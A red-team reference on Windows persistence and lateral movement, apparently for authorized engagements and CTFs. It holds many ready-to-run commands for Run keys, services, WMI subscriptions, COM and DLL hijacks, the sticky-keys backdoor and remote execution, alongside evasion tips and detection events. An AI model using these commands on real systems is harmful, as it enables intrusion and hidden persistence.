# Red Team - Persistence & Lateral Movement

## Table of Contents
- [Operator's View](#operators-view)
- [Persistence: Selection Criteria](#persistence-selection-criteria)
- [Registry Run / RunOnce Keys](#registry-run--runonce-keys)
- [Scheduled Tasks](#scheduled-tasks)
- [Windows Services](#windows-services)
- [Startup Folder](#startup-folder)
- [WMI Event Subscription](#wmi-event-subscription)
- [COM Hijacking](#com-hijacking)
- [DLL Hijacking / Proxying](#dll-hijacking--proxying)
- [IFEO Debugger & Accessibility](#ifeo-debugger--accessibility)
- [Logon Scripts & Userinit/Shell](#logon-scripts--userinitshell)
- [Domain-Level Persistence (pointers)](#domain-level-persistence-pointers)
- [Lateral Movement: Overview](#lateral-movement-overview)
- [Token Manipulation](#token-manipulation)
- [PsExec / SCM Service Creation](#psexec--scm-service-creation)
- [WMI Execution](#wmi-execution)
- [WinRM / PowerShell Remoting](#winrm--powershell-remoting)
- [DCOM Execution](#dcom-execution)
- [Scheduled Task / at Remote](#scheduled-task--at-remote)
- [Mapping to Cobalt Strike](#mapping-to-cobalt-strike)
- [Detection Footprint Summary](#detection-footprint-summary)

For the impacket/nxc/evil-winrm command equivalents of every lateral technique below see ../ctf-ad/lateral-movement.md (see ctf-ad pack, `lateral-movement.md`). For domain-dominance persistence (golden/silver/diamond, certs, AdminSDHolder) see ../ctf-ad/domain-dominance.md (see ctf-ad pack, `domain-dominance.md`). For the Beacon commands themselves see [c2-frameworks.md](c2-frameworks.md). For telemetry, sleep, and lifecycle opsec see [opsec-and-lifecycle.md](opsec-and-lifecycle.md). For local privesc that these techniques may require see ../ctf-privesc (see ctf-privesc pack).

---

## Operator's View

Observation first: persistence is a liability, not a trophy. Every mechanism you plant is an artifact a blue team can find and pivot on. Plant the minimum, at the right integrity level, matched to how long the engagement runs and how the host is monitored. A single well-hidden COM hijack beats five Run keys.

Two axes decide everything:
- **Integrity/privilege**: user-context persistence (Run key, user COM hijack, per-user task) survives without admin but dies with the user profile and triggers on logon only. SYSTEM/admin persistence (service, WMI subscription, HKLM) survives reboot and runs early, but writing it is louder and needs elevation.
- **Trigger**: logon, boot, time, event, or on-demand (lateral). Match the trigger to your callback needs — a boot-triggered service that beacons at 3am into a monitored SOC is worse than an on-demand re-entry via valid creds.

Often the best "persistence" is **valid credentials + a lateral technique** (below), leaving no on-host implant at all.

---

## Persistence: Selection Criteria

| Mechanism | Priv needed | Trigger | Survives reboot | Relative noise |
|---|---|---|---|---|
| Run/RunOnce (HKCU) | user | logon | yes | low-med (autoruns) |
| Run (HKLM) | admin | logon (any user) | yes | med |
| Scheduled task | user/admin | time/logon/event | yes | med |
| Service | admin/SYSTEM | boot | yes | med-high (7045) |
| Startup folder | user | logon | yes | low (well-known) |
| WMI event sub | admin | event | yes | low visibility / high value |
| COM hijack | user (HKCU) | app/COM load | yes | low (underwatched) |
| DLL hijack/proxy | depends on target dir | target app load | yes | low if signed-proc |
| IFEO / accessibility | admin | debugger/SATrigger | yes | high (well-known) |
| Logon script | user/admin | logon | yes | med |

Cross-check with detection assumptions in [opsec-and-lifecycle.md](opsec-and-lifecycle.md). Sysmon/EDR autoruns coverage is broad — assume Run keys, services, tasks, and startup folder are watched; COM/DLL/WMI are comparatively underwatched but far from invisible.

---

## Registry Run / RunOnce Keys

Runs a command at logon. HKCU = current user (no admin); HKLM = all users (admin).

```
# HKCU (user context, per-user logon)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\Public\u.exe" /f
# HKLM (all users, needs admin)
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\ProgramData\u.exe" /f
# RunOnce = fires once then deletes itself
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v X /t REG_SZ /d "..." /f
```

- Also watched: `...\Policies\Explorer\Run`, `...\RunServices`, `Wow6432Node\...\Run`.
- Point at a signed LOLBIN + argument (e.g. `rundll32`, `regsvr32 /s /u /i:http...`) rather than a raw EXE where the profile allows, but note LOLBIN-in-Run is itself a known hunt. First-tier autoruns hit — use for short ops or as decoy.

---

## Scheduled Tasks

Flexible triggers (logon, boot, time, idle, event ID). `schtasks` or PowerShell `*-ScheduledTask`.

```
# time trigger, current user
schtasks /create /tn "OneDrive Sync" /tr "C:\...\u.exe" /sc minute /mo 60 /f
# at logon
schtasks /create /tn "Updater" /tr "C:\...\u.exe" /sc onlogon /f
# at boot as SYSTEM (needs admin)
schtasks /create /tn "WinDefendSvc" /tr "C:\...\u.exe" /sc onstart /ru SYSTEM /rl HIGHEST /f
# event-triggered (e.g. on Security 4624 logon) via XML
schtasks /create /tn X /xml task.xml /f
```

- PowerShell: `Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute ...) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName ...`.
- Tasks are stored under `C:\Windows\System32\Tasks\<name>` (XML) + registry `...\Schedule\TaskCache\Tree`. Name to blend with vendor tasks; nest under an existing folder path.
- Event IDs: 106 (registered), 140 (updated), 200/201 (action run), 4698 (Security, created). Assume all logged.

---

## Windows Services

Boot-start persistence at SYSTEM. Needs admin to create.

```
sc create WinHelpSvc binPath= "C:\ProgramData\u.exe" start= auto DisplayName= "Windows Help"
sc description WinHelpSvc "Provides help."
sc start WinHelpSvc
# service-DLL variant (svchost-hosted) is stealthier: point ServiceDll under Parameters
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinHelpSvc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\...\u.dll" /f
```

- A plain EXE service must implement the service control handler or SCM kills it in ~30s; use a service-aware wrapper, or a `svchost` **ServiceDll** (implements `ServiceMain`) which is quieter and native-looking.
- **Event 7045** (service installed, System log) is the signature tell — high fidelity, widely alerted. Also 4697 (Security). Reserve services for when you need boot+SYSTEM and can accept the noise.

---

## Startup Folder

Drop a shortcut/exe; runs at that user's logon. No admin for per-user.

```
# per-user
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
# all users (admin)
%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\
```

- A `.lnk` to a LOLBIN, an `.hta`, or a `.vbs` here all fire at logon. Well-known location — first place hunters look; low sophistication.

---

## WMI Event Subscription

Fileless, admin-level, event-triggered persistence with **low autoruns visibility** — a high-value technique. Three components in the `root\subscription` namespace:

```
# 1. __EventFilter  - the trigger (WQL query), here: ~200s after boot
# 2. CommandLineEventConsumer - the action (run a command)
# 3. __FilterToConsumerBinding - links filter -> consumer
```

```powershell
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
  Name='WinUpd'; EventNamespace='root\cimv2'; QueryLanguage='WQL';
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
  Name='WinUpd'; CommandLineTemplate='powershell -nop -w hidden -enc <b64>'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}
```

- Triggers: uptime (as above), `Win32_LogonSession` creation (logon), process start, time-of-day (`__InstanceModificationEvent` on `Win32_LocalTime`).
- Runs as SYSTEM. Survives reboot, no file dropped, invisible to most autoruns tooling — but detectable via `Get-WmiObject -Namespace root\subscription -Class __EventFilter/CommandLineEventConsumer/__FilterToConsumerBinding` and Sysmon Event IDs **19/20/21** (WMI filter/consumer/binding). Assume mature EDR watches these.
- BOF/PowerShell tooling: `Register-CimSubscription`-style scripts, SharpWMI, PowerLurk.

---

## COM Hijacking

Redirect a COM CLSID to your DLL. HKCU takes precedence over HKLM for the same CLSID (LoadLibrary search of `InprocServer32`), so a **user-writable** hijack of a CLSID an auto-run process loads = persistence without admin and with low visibility.

```
# hijack a CLSID's in-process server under HKCU (wins over HKLM)
reg add "HKCU\Software\Classes\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "C:\Users\me\evil.dll" /f
reg add "HKCU\Software\Classes\CLSID\{GUID}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
```

- Find candidates: CLSIDs referenced by scheduled tasks (task XML `<ComHandler><ClassId>`), by Explorer, or missing/abandoned `InprocServer32` entries (procmon "NAME NOT FOUND" on HKCU\...\CLSID). Tools: `acCOMplice`, procmon filter on `RegOpenKey` + `NAME NOT FOUND` + `CLSID`.
- Hijacking a **task-referenced** CLSID = your DLL loads when that task fires (great: legitimate trigger, native process). Underwatched vs Run keys; still visible to autoruns/EDR that enumerate COM.

---

## DLL Hijacking / Proxying

A signed process loads an attacker DLL from a writable directory ahead of the legit one (search-order abuse), or your DLL sits in place of a missing one. **Proxying** = your DLL forwards its exports to the real DLL so the host app keeps working.

```
# proxy exports so the host app functions (def file / forwarders)
# EXPORTS
#   RealFunc=realdll.RealFunc @1
```

- Common vectors: app dir writable by user, `KnownDLLs` gaps, side-by-side, and "phantom" DLLs (referenced but absent). Enumerate with procmon (`NAME NOT FOUND` on `*.dll` in a process's dir) or existing lists (Hijacklibs).
- Persistence angle: hijack a DLL loaded by an auto-started signed app -> your code runs in a trusted, signed process (good for evasion). Proxying (DLL export forwarding via `.def` or tools like `SharpDllProxy`/`Spartacus`/`DLLirant`) avoids breaking the host.
- Detection: unsigned/unexpected DLL load from a non-system path by a signed binary (Sysmon EID 7 ImageLoad). Signed-process host reduces process-level alerts but the load path is the tell.

---

## IFEO Debugger & Accessibility

Well-known, high-signal — use only when you accept the noise (or for CTF).

```
# IFEO debugger: launching <target>.exe instead launches your "debugger"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\...\u.exe" /f
# Accessibility (sethc.exe sticky keys, utilman.exe) via IFEO debugger -> SYSTEM shell at logon screen
reg add "...\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
```

- Classic sticky-keys/utilman backdoor: Shift x5 (sethc) or the ease-of-access button (utilman) at the lock screen spawns your debugger as SYSTEM. Also the old file-replace variant (replace `sethc.exe`) — both heavily signatured.
- `GlobalFlag` + `SilentProcessExit` monitor is a related IFEO variant that triggers on a target's exit.
- Detection: any `Debugger` value under IFEO is a top-tier hunt; sticky-keys registry/file changes are alerted by default in most stacks.

---

## Logon Scripts & Userinit/Shell

```
# per-user logon script (no admin)
reg add "HKCU\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\...\u.bat" /f
# Winlogon Userinit / Shell (admin; append, keep the original!)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\...\u.exe" /f
```

- `UserInitMprLogonScript` (HKCU\Environment) is a low-priv, underwatched logon-script vector.
- Winlogon `Shell`/`Userinit`: **append** to the existing value (comma-separated) — replacing it breaks logon. High value (runs every logon in user context) but a known key.
- Group Policy logon scripts (`\\domain\SYSVOL\...\scripts`) = domain-wide persistence if you can write GPO — see domain pointers below.

---

## Domain-Level Persistence (pointers)

Do not duplicate — these live in ../ctf-ad/domain-dominance.md (see ctf-ad pack, `domain-dominance.md`). When you hold domain dominance, host persistence is usually unnecessary; forge/plant at the domain layer:

- **Golden ticket** — forge TGT with the `krbtgt` key (offline, any user/group). Detail + Rubeus/mimikatz syntax in domain-dominance.md.
- **Silver ticket** — forge a service ticket with a service account key (scoped to one service/host).
- **Diamond / Sapphire ticket** — modify a legitimately-issued TGT's PAC (stealthier than golden) — see ../ctf-ad/kerberos.md (see ctf-ad pack, `kerberos.md`) and domain-dominance.md.
- **Golden certificate** — steal the CA private key, forge auth certs for any principal (survives password resets). See ../ctf-ad/adcs.md (see ctf-ad pack, `adcs.md`).
- **AdminSDHolder** — write an ACE on the AdminSDHolder object; SDProp re-applies it to protected groups hourly -> durable admin. See ../ctf-ad/acl-abuse.md (see ctf-ad pack, `acl-abuse.md`).
- **ACL backdoors** — DCSync rights (`DS-Replication-Get-Changes*`) on the domain head, `GenericAll`/`WriteDACL` on key objects. See ../ctf-ad/acl-abuse.md (see ctf-ad pack, `acl-abuse.md`).
- **DSRM** / **SID history** / **GPO abuse** — additional durable footholds in domain-dominance.md.

---

## Lateral Movement: Overview

Move by executing code on a remote host using **valid credentials or a token**. All techniques below need (a) an identity that has remote-admin rights on the target and (b) a network path to the relevant service. Establish the identity first (`make_token`/`steal_token`/PTH/PTT — see [Token Manipulation](#token-manipulation)), then pick a technique by which port/protocol is open and which is quietest on the target.

Ports: SMB 445, WinRM 5985/5986, WMI 135 + dynamic (or 445 for named-pipe DCOM), RPC/DCOM 135+dynamic, RDP 3389.

For every technique the impacket/nxc/evil-winrm command form is in ../ctf-ad/lateral-movement.md (see ctf-ad pack, `lateral-movement.md`); here the focus is the operator-via-C2 view + footprint.

---

## Token Manipulation

Establish "who you are to the network" before moving. (Beacon verbs; see [c2-frameworks.md](c2-frameworks.md).)

```
make_token DOMAIN\user Passw0rd!   # network-only impersonation token from plaintext creds
steal_token <pid>                  # duplicate a token from a process you can access
rev2self                           # revert to your original token
pth DOMAIN\user <NTLMHASH>         # pass-the-hash (mimikatz sekurlsa::pth; touches LSASS)
kerberos_ticket_use ticket.kirbi   # pass-the-ticket (PTT) into current logon session
```

- **make_token**: LOGON_NEW_CREDENTIALS (type 9) — affects outbound network auth only; local actions still run as the beacon user. Verify with `getuid`. Cheapest, no LSASS touch, but needs plaintext creds.
- **pass-the-hash (`pth`)**: NT hash -> logon session; enables NTLM auth to targets. Invokes mimikatz; strong LSASS-access telemetry.
- **overpass-the-hash / pass-the-key**: turn a hash/AES key into a Kerberos TGT (`execute-assembly Rubeus.exe asktgt /user: /rc4:|/aes256:`), then `kerberos_ticket_use`. Pure-Kerberos, avoids NTLM. See ../ctf-ad/kerberos.md (see ctf-ad pack, `kerberos.md`).
- **pass-the-ticket**: inject a stolen/forged `.kirbi`/ccache. Foundation of golden/silver ticket use.
- Detection: `make_token` generates a **4624 Logon Type 9** with `SeclogonNewCredentials` — a specific, huntable pattern. PTH/PTT/overpass tells are in ../ctf-ad/lateral-movement.md (see ctf-ad pack, `lateral-movement.md`) and ../ctf-ad/kerberos.md (see ctf-ad pack, `kerberos.md`).

---

## PsExec / SCM Service Creation

Create+start a service on the target over SMB (445) via the Service Control Manager; the service binPath/command runs as SYSTEM.

```
# native
sc \\TARGET create X binPath= "cmd /c C:\...\u.exe" start= demand
sc \\TARGET start X
# scshell (stealthier: HIJACK an EXISTING service's binPath instead of creating one)
#   scshell.exe TARGET <ServiceName>   -> temporarily rewrites binPath, runs, restores
```

- **CS**: `jump psexec64 TARGET listener` (drops a Service EXE + new Beacon) or `remote-exec psexec TARGET <cmd>` (runs a command, no Beacon). Both authenticate with the **current token**.
- **scshell** (Mr-Un1k0d3r): does **not** create a service — it modifies an existing service's `ImagePath`/binPath, starts it, then restores. No 7045, quieter than classic psexec. External tool, not a CS built-in.
- Footprint: classic psexec = **Event 7045** (service installed) + 4697, service EXE on disk (or ADMIN$ write), named pipe (`\\.\pipe\...`). Named-pipe impersonation for SYSTEM is the SCM tell. scshell avoids 7045 but changing binPath is itself detectable.

---

## WMI Execution

Run a process on the target via WMI `Win32_Process::Create` over RPC (135 + dynamic). No service, no new-Beacon requirement — the "wmiexec" pattern.

```
# native
wmic /node:TARGET /user:DOMAIN\user process call create "cmd /c C:\...\u.exe"
# PowerShell
Invoke-CimMethod -ComputerName TARGET -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='...'}
```

- **CS**: `remote-exec wmi TARGET <cmd>` — fires a one-liner (e.g. to bootstrap an SMB Beacon). Uses current token.
- Footprint: **Event 4688 / Sysmon 1** with parent **`WmiPrvSE.exe`** — the signature tell of WMI exec. No service, no disk artifact if the command is fileless. impacket `wmiexec.py` output-retrieval writes to `ADMIN$` (adds SMB file writes).

---

## WinRM / PowerShell Remoting

Run PowerShell on the target over WinRM (5985 HTTP / 5986 HTTPS).

```
# PowerShell remoting
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami }
Enter-PSSession -ComputerName TARGET
# from Linux
evil-winrm -i TARGET -u user -p pass        # see ctf-ad/lateral-movement.md
```

- **CS**: `jump winrm64 TARGET listener` (spawns a Beacon via a PowerShell payload over WinRM) or `remote-exec winrm TARGET <cmd>`.
- Requires WinRM enabled + target membership in Remote Management Users / local admin. Uses current token / Kerberos.
- Footprint: parent **`wsmprovhost.exe`** for remoting-launched processes; WinRM operational log (Microsoft-Windows-WinRM), 4688 with wsmprovhost parent, PowerShell script-block logging (4104) if enabled. Kerberos auth by default (no NTLM tell if configured).

---

## DCOM Execution

Instantiate a remote DCOM object exposing a method that runs code (135 + dynamic RPC). No service.

```
# MMC20.Application (classic)
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$c.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c C:\...\u.exe","7")
# other objects: ShellWindows, ShellBrowserWindow, Excel.Application (DDEInitiate), Outlook.CreateObject
```

- No first-class CS `jump`/`remote-exec` DCOM method — deliver via a `remote-exec`/`powershell` one-liner or impacket `dcomexec.py` (see ../ctf-ad/lateral-movement.md (see ctf-ad pack, `lateral-movement.md`)).
- Footprint: child process under the DCOM host (e.g. `mmc.exe`, `excel.exe`, `explorer.exe`) — anomalous parent-child is the tell. Underwatched relative to psexec but modern EDR flags mmc.exe->cmd.exe.

---

## Scheduled Task / at Remote

Create a remote scheduled task (the "atexec"/schtasks-remote pattern) over SMB/RPC.

```
schtasks /create /s TARGET /u DOMAIN\user /tn X /tr "cmd /c C:\...\u.exe" /sc onstart /ru SYSTEM
schtasks /run /s TARGET /tn X
schtasks /delete /s TARGET /tn X /f
```

- `at`/`atexec.py` uses the legacy AT service (now via Task Scheduler). Runs as SYSTEM by default with `/ru SYSTEM`.
- No first-class CS jump method; use `remote-exec` or a task-creation BOF. impacket `atexec.py` equivalent in ../ctf-ad/lateral-movement.md (see ctf-ad pack, `lateral-movement.md`).
- Footprint: **4698** (task created) on target + task XML in `System32\Tasks`; task action run events. SYSTEM-context task creation is huntable.

---

## Mapping to Cobalt Strike

| Technique | Native / tool | CS Beacon | Remote artifact | Parent process (tell) |
|---|---|---|---|---|
| SCM service (psexec) | `sc create` / PsExec | `jump psexec64` / `remote-exec psexec` | service + EXE, pipe | `services.exe` -> your svc |
| Service binPath hijack | scshell | (via `remote-exec`) | none (binPath edit) | existing service host |
| WMI process create | `wmic` / CIM | `remote-exec wmi` | none (fileless) | `WmiPrvSE.exe` |
| WinRM / PS remoting | `Invoke-Command` | `jump winrm64` / `remote-exec winrm` | none | `wsmprovhost.exe` |
| DCOM | MMC20/ShellWindows | (one-liner via remote-exec) | none | `mmc.exe`/`excel.exe` |
| Remote sched task | `schtasks /s` | (remote-exec / BOF) | task XML | `taskeng`/`svchost` Schedule |
| RDP | mstsc / xfreerdp | (tunnel via `socks`) | logon session | `tstheme`/interactive |

`jump` = drop a new Beacon (needs a listener). `remote-exec` = run one command (no Beacon). Both authenticate with the **current token** — set it first (see [Token Manipulation](#token-manipulation)).

---

## Detection Footprint Summary

| Technique | Key events | Quiet? |
|---|---|---|
| psexec (SCM) | 7045, 4697, 4624 T3, named pipe | No — 7045 is high-fidelity |
| scshell | service config change (4657/reg), 4624 | Medium |
| WMI exec | 4688/Sysmon1 parent `WmiPrvSE.exe`, WMI-Activity 5857/5861 | Medium |
| WinRM | 4688 parent `wsmprovhost.exe`, WinRM oplog, 4104 | Medium (Kerberos hides auth) |
| DCOM | anomalous parent-child (mmc/excel -> cmd) | Medium-high on modern EDR |
| Remote schtask | 4698 + task XML | Medium |
| make_token | 4624 Logon Type 9 (NewCredentials) | Low-medium (specific pattern) |
| PTH (`pth`) | LSASS access, 4624 T9, NTLM | Higher (LSASS touch) |

Note: parent-process anomaly (`WmiPrvSE.exe`/`wsmprovhost.exe`/`services.exe` spawning cmd/powershell) is the single most reliable lateral-movement signal across all of the above — the network auth event alone is often benign. For the full telemetry model and how sleep/jitter interact with these bursts see [opsec-and-lifecycle.md](opsec-and-lifecycle.md); for blue-team detail on the AD side see ../ctf-ad/opsec-and-detection.md (see ctf-ad pack, `opsec-and-detection.md`).
